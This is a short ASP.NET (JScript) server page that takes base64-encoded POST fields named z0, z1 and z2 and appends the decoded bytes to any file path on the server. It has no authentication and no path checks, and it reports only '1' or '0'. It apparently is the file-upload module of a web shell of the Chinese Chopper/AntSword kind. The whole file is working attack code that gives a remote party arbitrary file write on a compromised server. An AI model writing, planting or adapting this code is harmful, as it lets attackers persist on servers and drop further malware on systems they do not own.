<%

Server.ScriptTimeout = 999999; 

function base64Decode(str) {
    if (!str || str == "")
        return "";

    var bytes = System.Convert.FromBase64String(str);

    return System.Text.Encoding.UTF8.GetString(bytes);
}

var szFilePath = base64Decode(Request.Form["z0"]);
var szChunkSize = Request.Form["z1"] != null ? base64Decode(Request.Form["z1"]) : ""; 
var szb64Data = base64Decode(Request.Form["z2"]);

var c = szb64Data.Replace("\r", "").Replace("\n", "");

var fileStream = null;

try {
    var buf = System.Convert.FromBase64String(c);
    fileStream = new System.IO.FileStream(szFilePath, System.IO.FileMode.Append, System.IO.FileAccess.Write);
    fileStream.Write(buf, 0, buf.Length);
    fileStream.Close();
    
    Response.Write("1");
}
catch (ex) {
    if (fileStream != null) {
        fileStream.Close();
    }
    Response.Write("0");
}

%>